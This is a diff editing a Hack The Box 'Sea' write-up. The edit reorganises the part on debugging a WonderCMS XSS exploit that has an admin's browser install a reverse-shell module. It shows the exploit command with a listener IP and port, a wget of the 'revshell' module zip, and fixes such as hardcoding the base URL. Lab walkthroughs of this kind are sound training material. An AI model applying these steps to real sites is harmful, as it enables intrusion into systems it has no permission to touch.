@@ -120,12 +120,7 @@ python exploit.py http://sea.htb/loginURL 10.10.14.208 4444
 
 ![Exploit output](/joaobonin/images/htb-sea/exploit-output.png)
 
-The exploit generates `xss.js`, starts an HTTP server on port 8000, and instructs you to send the malicious link to the admin. Since the target has no internet access, we need to host `main.zip` (revshell module) locally:
-
-```bash
-wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
-# place main.zip in the same directory as the exploit (served on port 8000)
-```
+The exploit generates `xss.js`, starts an HTTP server on port 8000, and instructs you to send the malicious link to the admin.
 
 ### Debugging the exploit
 
@@ -141,15 +136,26 @@ But no reverse shell. Time to debug `xss.js`.
 
 ![xss.js original code](/joaobonin/images/htb-sea/xss-js-original.png)
 
-The problem was in the `urlWithoutLogBase` variable. Using the browser console to simulate:
+Reading through the exploit code, I identified several issues.
+
+### Fix 1: Host main.zip locally
+
+The `xss.js` payload tries to download `main.zip` from GitHub and install it as a WonderCMS module. Since the target has no internet access, we need to host `main.zip` locally and point the exploit to our machine.
+
+```bash
+wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
+# place main.zip in the same directory as the exploit (served on port 8000)
+```
+
+### Fix 2: Hardcode urlWithoutLogBase
+
+The next issue was the `urlWithoutLogBase` variable. Using the browser console to simulate:
 
 ![Debug urlWithoutLogBase](/joaobonin/images/htb-sea/debug-urlbase.png)
 
 `urlWithoutLogBase` resolved to `/`, making `urlRev` become `//?installModule=...` - an invalid URL:
 
 ![Debug urlRev broken](/joaobonin/images/htb-sea/debug-urlrev.png)
-
-### Fix 1: Hardcode urlWithoutLogBase
 
 I edited the exploit to hardcode `urlWithoutLogBase = 'http://sea.htb/'`:
 
@@ -159,7 +165,7 @@ I resubmitted the form. This time the target made requests to `main.zip`, but I 
 
 ![Error after fix](/joaobonin/images/htb-sea/exploit-error.png)
 
-### Fix 2: HTTPS to HTTP
+### Fix 3: HTTPS to HTTP
 
 I changed `https://` to `http://` in the installModule URL inside the exploit. Resubmitted once more:
 
